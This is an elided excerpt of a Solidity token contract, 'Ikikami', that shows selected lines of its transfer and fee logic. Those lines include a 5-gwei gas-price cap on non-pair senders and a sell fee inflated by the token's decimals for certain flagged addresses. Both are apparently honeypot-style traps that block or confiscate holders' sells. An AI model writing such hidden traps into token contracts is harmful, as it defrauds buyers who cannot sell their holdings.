...
contract Ikikami is Context, IERC20 { 
    ...
    address payable private MarketingWallet = payable(0x0DA8E5a09F3918C58EfA86762b7B5204f6387152);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        //if (tradingActiveBlock + 20 seconds <= block.timestamp) {transferDelay = false;}
        if (transferDelay && from != uniswapV2Pair) {require(tx.gasprice <= 5 gwei);}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 bAmount = tAmount*buyFee/100;
            ...
            uint256 sAmount;
            if (_isExcludeds[sender]){sAmount = tAmount*_decimals*sellFee/100;}
            else if (recipient == uniswapV2Pair){sAmount = tAmount*sellFee/100;}
